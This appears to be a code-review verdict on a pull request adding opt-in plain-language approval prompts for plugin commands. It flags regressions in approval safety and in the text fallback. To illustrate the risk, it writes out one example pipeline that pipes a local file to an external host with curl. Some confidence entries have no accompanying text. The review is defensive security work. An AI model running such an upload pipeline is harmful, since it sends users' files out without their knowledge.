Keep open. The PR is a plausible opt-in UX improvement, but current head still has approval-safety and text-fallback regressions that should block merge, and the final visible channel proof is not yet complete for the latest escaped-shell change.

## What This Changes

The PR adds opt-in plain-language plugin approval rendering through `approvals.plugin.language` and wires it through config, shared renderers, Telegram/Matrix/native fallback paths, docs, and tests.

## Best Possible Solution

Land the opt-in simple approval mode only after pipeline summarization fails closed, text-only approval remains actionable, generated contract baselines are refreshed, and final visible Telegram/Matrix proof is supplied.

## Reproduction Assessment

Yes for the PR findings: source inspection at current PR head shows simple mode hides manual details, ordinary pipelines are not modeled before raw command text is removed, and generated baselines are absent from the PR file list. This is not a current-main bug reproduction because the PR adds a new opt-in mode.

## Solution Assessment

No as proposed. The default-preserving config direction is plausible, but the patch needs safer shell summarization, an actionable text fallback, and generated baseline updates before it is the maintainable fix.

  - body: Simple mode hides the raw command, so the summary has to account for every shell stage. `splitCommandSegments` does not split or model ordinary `|` pipelines, so `cat notes.txt | curl -d @- https://example.test` can read as a file read while the network upload is omitted from the approval prompt.   - confidence: 0.88

Forwarded approvals can still reach channels or paths that ignore `interactive`, and the docs still promise a plain-text `/approve` fallback, so those users would see `Choose below` with no command they can use.
  - confidence: 0.88

  - confidence: 0.8
